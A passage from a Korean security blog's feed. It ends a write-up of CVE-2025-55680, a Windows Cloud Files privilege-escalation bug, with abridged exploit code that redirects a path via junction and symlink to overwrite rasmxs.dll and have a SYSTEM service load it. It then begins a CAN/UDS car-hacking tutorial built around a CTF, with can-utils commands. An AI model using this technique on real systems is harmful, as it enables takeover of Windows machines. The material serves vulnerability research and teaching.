&#xC9C1;&#xD6C4; thread1()&#xC774; &#xD574;&#xB2F9; &#xBC14;&#xC774;&#xD2B8;&#xB97C; <code>\</code>&#xB85C; &#xBC14;&#xAFD4; &#xB193;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCEE4;&#xB110;&#xC774; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; <code>boo\6.txt</code> &#xD615;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CreateJunction</span><span class="hljs-params">(LPCWSTR dir, LPCWSTR target)</span> </span>{  HANDLE hJunction;  DWORD cb;  <span class="hljs-keyword">wchar_t</span> printname[] = L <span class="hljs-string">&quot;&quot;</span>;  HANDLE hDir;  hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, <span class="hljs-literal">NULL</span>);...  <span class="hljs-keyword">if</span> (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp; cb, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">free</span>(Data);    <span class="hljs-keyword">return</span> TRUE;...}<span class="hljs-function">BOOL <span class="hljs-title">DosDeviceSymLink</span><span class="hljs-params">(LPCWSTR object, LPCWSTR target)</span> </span>{  <span class="hljs-keyword">if</span> (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {    <span class="hljs-keyword">return</span> TRUE;...}</code></pre><p>&#xD55C;&#xD3B8; <code>CreateJunction()</code>&#xACFC; <code>DosDeviceSymLink()</code>&#xB97C; &#xD1B5;&#xD574; &#xACBD;&#xB85C; &#xD574;&#xC11D; &#xCCB4;&#xC778;&#xC744; &#xAD6C;&#xC131;&#xD574;&#xB461;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; <code>C:\ProgramData\cldpwn\boo\</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; NTFS junction&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4; NT &#xB124;&#xC784;&#xC2A4;&#xD398;&#xC774;&#xC2A4; &#xC0C1;  <code>\RPC Control</code>&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC5B4;&#xC11C; <code>GLOBAL\GLOBALROOT\RPC\Control\6.txt</code>&#xB97C; <code>\??\C:\Windows\System32\rasmxs.dll</code>&#xB85C; &#xD5A5;&#xD558;&#xB294; DOS &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB85C; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACB0;&#xACFC; &#xCEE4;&#xB110;&#xC774; &#xBCF4;&#xB294; &#xCD5C;&#xC885; &#xACBD;&#xB85C; &#xD750;&#xB984;&#xC740; <code>C:\ProgramData\cldpwn\boo\6.txt</code> &#x2192; <code>\RPC Control\6.txt</code> &#x2192; <code>C:\Windows\System32\rasmxs.dll</code>&#xAC00; &#xB418;&#xBA74;&#xC11C; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD574; &#xC4F0;&#xAE30; &#xAC00;&#xB2A5;&#xD55C; &#xD30C;&#xC77C; &#xD578;&#xB4E4;&#xC744; &#xC5F4;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">CreateFile(<span class="hljs-string">L&quot;C:\\Windows\\System32\\rasmxs.dll&quot;</span>, GENERIC_WRITE,...);WriteFile(handle, buffer, bytesRead, ...);trigger_loadlibrary(<span class="hljs-number">1</span>);</code></pre><p>&#xC774; &#xD578;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC900;&#xBE44;&#xD55C; &#xC545;&#xC131; DLL &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; <code>WriteFile()</code>&#xB85C; &#xC2DC;&#xC2A4;&#xD15C; &#xACBD;&#xB85C;&#xC758; <code>rasmxs.dll</code>&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <code>trigger_loadlibrary(1)</code>&#xC774; <code>rasman.dll</code> &#xB0B4;&#xBD80; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; rasman &#xC11C;&#xBE44;&#xC2A4;&#xC640;&#xC758; RPC &#xD638;&#xCD9C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC11C;&#xBE44;&#xC2A4; &#xCABD;&#xC5D0;&#xC11C; &#xD3C9;&#xC18C; &#xB3D9;&#xC791;&#xB300;&#xB85C; <code>C:\Windows\System32\rasmxs.dll</code>&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB3C4;&#xB85D; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; DLL &#xB0B4;&#xC6A9;&#xC740; &#xACF5;&#xACA9;&#xC790; &#xCF54;&#xB4DC;&#xB85C; &#xAD50;&#xCCB4;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC218;&#xC815;&#xB41C; <code>rasmxs.dll</code>&#xC774; rasmans &#xC11C;&#xBE44;&#xC2A4; SYSTEM &#xAD8C;&#xD55C; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xACE0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55680">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-55680</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/CLDFLT/">CLDFLT</category>
      
      <category domain="https://hackyboiz.github.io/tags/TOCTOU/">TOCTOU</category>
      
      <category domain="https://hackyboiz.github.io/tags/Minifilter/">Minifilter</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/22/banda/CVE-2025-55680/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] BlockHarbor CTF와 CVE로 알아보는 CAN / UDS 취약점 (KR)</title>
      <link>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/</link>
      <guid>https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/kr/</guid>
      <pubDate>Thu, 20 Nov 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>&#xCC28;&#xB7C9; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xD65C;&#xC6A9;&#xB418;&#xB294; &#xBD84;&#xC57C;&#xAC00; &#xBC14;&#xB85C; CAN &#xD1B5;&#xC2E0;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; CAN &#xD1B5;&#xC2E0;&#xC5D0;&#xC11C;&#xB3C4; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;! &#xC774; &#xCC28;&#xB7C9; &#xBD84;&#xC57C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CTF&#xC640; &#xB300;&#xD68C;&#xB4E4; &#xB610;&#xD55C; &#xB9CE;&#xC774; &#xAC1C;&#xCD5C;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(Defcon&#xC5D0;&#xC11C;&#xB3C4; car hacking village&#xAC00; &#xC788;&#xC8E0;).</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xCC28;&#xB7C9; &#xD574;&#xD0B9; CTF&#xB85C; &#xAC00;&#xC7A5; &#xC720;&#xBA85;&#xD55C; CTF &#xC911; &#xD558;&#xB098;&#xC778; BlockHarbor CTF &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xCC28;&#xB7C9; &#xD1B5;&#xC2E0;&#xACFC; &#xC774;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-CAN-Bus-amp-UDS"><a href="#1-CAN-Bus-amp-UDS" class="headerlink" title="1. CAN Bus &amp; UDS"></a>1. CAN Bus &amp; UDS</h2><p><img src="image02.png" alt="[image02.png](https://t-shaped-person.tistory.com/51)"></p><p>CAN &#xD1B5;&#xC2E0;&#xC740; &#xCC28;&#xB7C9; &#xB0B4;&#xC758; ECU(&#xC804;&#xC790; &#xC81C;&#xC5B4; &#xC7A5;&#xCE58;) &#xAC19;&#xC740; &#xC7A5;&#xCE58;&#xB4E4; &#xAC04;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xC704;&#xD574; &#xAC1C;&#xBC1C;&#xB41C; &#xD1B5;&#xC2E0; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. Non-host &#xBC84;&#xC2A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0; &#xAE30;&#xBC18;&#xC758; &#xC800;&#xC218;&#xC900; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. 1983&#xB144;&#xC5D0; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; HTTP&#xBCF4;&#xB2E4; &#xBA3C;&#xC800; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;! CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; 8 Byte&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xACE0;, &#xC774;&#xB97C; &#xD655;&#xC7A5;&#xD55C; CAN-FD&#xB294; 64 Byte&#xAE4C;&#xC9C0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ISO 15765&#xC5D0; &#xC758;&#xD574; CAN &#xD1B5;&#xC2E0; &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xAD6D;&#xC81C; &#xD45C;&#xC900;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image03.png" alt="[image03.png](https://swisskyrepo.github.io/HardwareAllTheThings/protocols/can/)"></p><p>UDS&#xB294; &#xD1B5;&#xD569; &#xC9C4;&#xB2E8; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC758;&#xBBF8;&#xD558;&#xBA70;, &#xCC28;&#xB7C9; CTF&#xC640; CAN &#xD1B5;&#xC2E0;&#xC744; &#xC811;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; UDS&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xB97C; &#xC790;&#xC8FC; &#xB9C8;&#xC8FC;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; ECU&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC9C4;&#xB2E8; &#xD1B5;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xC218;&#xC900;&#xC758; CAN &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBCF4;&#xB2E4; &#xACE0;&#xC218;&#xC900;&#xC758; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB370;&#xC774;&#xD130; R/W &#xAC19;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, CAN &#xC704;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, CAN &#xBA54;&#xC2DC;&#xC9C0;&#xC640; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xCC28;&#xB7C9; &#xC9C4;&#xB2E8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; OBD2 &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xD63C;&#xC7AC; &#xB418;&#xC5B4; &#xC6A9;&#xC5B4; &#xC124;&#xBA85;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;. ISO 14229&#xB85C; UDS&#xC5D0; &#xB300;&#xD55C; &#xD45C;&#xC900;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88;&#xC5D0; &#xD480; BlockHarbor CTF&#xC5D0;&#xC11C;&#xB294; UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xB97C; &#xC544;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, UDS &#xBA54;&#xC2DC;&#xC9C0; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xAC04;&#xB2E8;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xAD6C;&#xC131;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC911;&#xC5D0;&#xC11C; &#xAC01; &#xBD80;&#xBD84;&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC124;&#xBA85;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>CAN ID: &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0; &#xD560; ECU</li><li>PCI: &#xC8FC;&#xB85C; UDS &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xAE38;&#xC774;, Flow Control &#xB4F1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;</li><li>SID: &#xC11C;&#xBE44;&#xC2A4; &#xC2DD;&#xBCC4;&#xC790;<ul><li>Sub Function Byte: SID&#xC5D0; &#xC138;&#xBD80;&#xC801;&#xC778; &#xC635;&#xC158;</li></ul></li><li>DID: &#xB370;&#xC774;&#xD130; &#xC2DD;&#xBCC4;&#xC790;</li></ul><p>&#xC774;&#xC911; &#xC911;&#xC694;&#xD55C; &#xBA87; &#xAC00;&#xC9C0; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image04.png" alt="image04.png"></p><p>CAN ID&#xB294; ISO 15765-4&#xC5D0; &#xC758;&#xD574;&#xC11C; &#xAC01; ECU&#xC5D0; &#xB300;&#xD55C; CAN ID &#xAC12;&#xC774; 16&#xC9C4;&#xC218;&#xB85C; &#xC815;&#xD574;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>7DF</code>&#xC758; &#xACBD;&#xC6B0; &#xC8FC;&#xB85C; &#xBAA8;&#xB4E0; ECU&#xC5D0; &#xB300;&#xD55C; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xB610;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xC774;&#xB098; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574; ECU&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xC2DD;&#xBCC4;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC1A1;&#xC2E0;&#xC758; &#xACBD;&#xC6B0; 1&#xBC88; ECU&#xB294; <code>7E0</code>, 2&#xBC88; ECU&#xB294; <code>7E1</code>&#xC640; &#xAC19;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC218;&#xC2E0;&#xC758; &#xACBD;&#xC6B0;&#xB294; &#xC1A1;&#xC2E0; &#xAC12;&#xC758; <code>+0x8</code>&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC9C0;&#xC815; &#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>SID&#xB294; &#xC27D;&#xAC8C; &#xC774;&#xC57C;&#xAE30; &#xD574;&#xC11C; &#xC774;&#xB7F0; &#xD589;&#xC704;(&#xC11C;&#xBE44;&#xC2A4;)&#xB97C; &#xD560; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC54C;&#xB824;&#xC8FC;&#xB294; &#xC2DD;&#xBCC4;&#xC790; &#xC785;&#xB2C8;&#xB2E4;. SID &#xAC12;&#xC740; &#xC5ED;&#xC2DC; &#xD45C;&#xC900;&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC9C1;&#xC811; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">&#xBB38;&#xC11C;</a>&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; SID &#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD;&#xD560; &#xB54C; SID &#xAC12;&#xC5D0; <code>+0x40</code>&#xC758; &#xAC12;&#xC774; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC751;&#xB2F5; SID &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD; SID &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC751;&#xB2F5; &#xAC12;&#xC778; RSID&#xAC00; &#xC798; &#xC218;&#xC2E0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74;, &#xD1B5;&#xC2E0;&#xC774; &#xC798; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; SID &#xC911;&#xC5D0;&#xC11C; Sub Function Byte&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; SID &#xC694;&#xCCAD; &#xC2DC;, &#xBCF4;&#xB2E4; &#xC138;&#xBD80;&#xC801;&#xC778; &#xC11C;&#xBE44;&#xC2A4; &#xC694;&#xCCAD;&#xC744; &#xC9C0;&#xCE6D;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC0AC;&#xC6A9;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xC5C6;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBB38;&#xC11C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>DID&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC9C0;&#xCE6D;&#xD558;&#xB294; &#xC2DD;&#xBCC4;&#xC790; &#xC785;&#xB2C8;&#xB2E4;. DID &#xAC12;&#xB3C4; ISO-14229 &#xD45C;&#xC900;&#xC5D0; &#xB530;&#xB77C; &#xC608;&#xC57D;&#xB41C; &#xAC12;&#xC774; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">&#xBB38;&#xC11C;</a>&#xB97C; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xD574;&#xB2F9;&#xD558;&#xB294; DID &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xB300;&#xD45C;&#xC801;&#xC740; DID&#xC758; &#xC608;&#xC2DC;&#xB294; &#xBC14;&#xB85C; &#xCC28;&#xB300; &#xBC88;&#xD638;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; VIN &#xAC12;&#xC778; <code>F190</code>&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; DID &#xAC12;&#xC744; SID&#xC640; &#xD568;&#xAED8; &#xC694;&#xCCAD;&#xD558;&#xBA74;, SID &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; VIN&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBC29;&#xAE08; &#xC124;&#xBA85;&#xD55C; Sub Function Byte&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; SID&#xC758; &#xACBD;&#xC6B0; DID&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC73C;&#xB85C; &#xD480; BlockHarbor CTF &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">SID</a>&#xC640; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a> &#xBB38;&#xC11C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC5F4;&#xC5B4; &#xB193;&#xACE0;, &#xADF8;&#xB54C;&#xB9C8;&#xB2E4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCC3E;&#xC544; &#xBB38;&#xC81C; &#xD480;&#xC774;&#xB97C; &#xD558;&#xB294; &#xAC83;&#xC774; &#xB9E4;&#xC6B0; &#xD544;&#xC218;&#xC801;&#xC785;&#xB2C8;&#xB2E4;!</p><h3 id="1-1-CAN-Utils"><a href="#1-1-CAN-Utils" class="headerlink" title="1.1. CAN Utils"></a>1.1. CAN Utils</h3><p><img src="image05.jpg" alt="image05.jpg"></p><p>CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; can-utils &#xB3C4;&#xAD6C;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB3C4;&#xAD6C;&#xB294; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; CAN &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xAD6C;&#xD604;&#xD55C; SocketCAN &#xAE30;&#xBC18;&#xC758; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xC544;&#xB798;&#xC758; &#xC608;&#xC81C;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">candump -a vcan0,7E0:7FF</code></pre><p>candump&#xB294; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC6D0;&#xD558;&#xB294; CAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C;&#xB294; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; ASCII &#xACB0;&#xACFC;&#xB97C; &#xAC19;&#xC774; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; <code>-a</code> &#xC635;&#xC158;&#xACFC; ECU1&#xC5D0;&#xC11C;&#xB9CC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xB3C4;&#xB85D; <code>7E0</code> &#xBC0F; <code>7FF</code> &#xB9C8;&#xC2A4;&#xD0B9; &#xC778;&#xC790;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xD6C4; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C;&#xC5D0;&#xB294; &#xD55C; &#xCABD; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xC11C; &#xC751;&#xB2F5;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xC6A9;&#xB3C4;&#xB85C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>cansend&#xB294; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xB294; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC5ED;&#xC2DC; &#xC6D0;&#xD558;&#xB294; CAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CAN 